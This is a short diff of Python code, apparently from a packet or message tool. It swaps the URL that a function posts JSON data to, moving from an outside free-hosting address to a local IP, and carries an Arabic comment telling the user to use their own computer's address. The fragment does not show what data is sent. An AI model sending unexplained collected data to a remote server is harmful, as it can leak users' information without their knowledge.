@@ -98,7 +98,7 @@ def gen_msg4(packet, content):
 import requests
 import json
 def pc(data):
-    url = "https://xtz-team.free.bg/data.txt"  # استبدل <YOUR_COMPUTER_IP> بعنوان IP الخاص بجهاز الكمبيوتر الخاص بك
+    url = "http://192.168.1.117:5000/data"  # استبدل <YOUR_COMPUTER_IP> بعنوان IP الخاص بجهاز الكمبيوتر الخاص بك
     headers = {'Content-Type': 'application/json'}
     response = requests.post(url, data=json.dumps(data), headers=headers)
     print("Server response:", response.json())
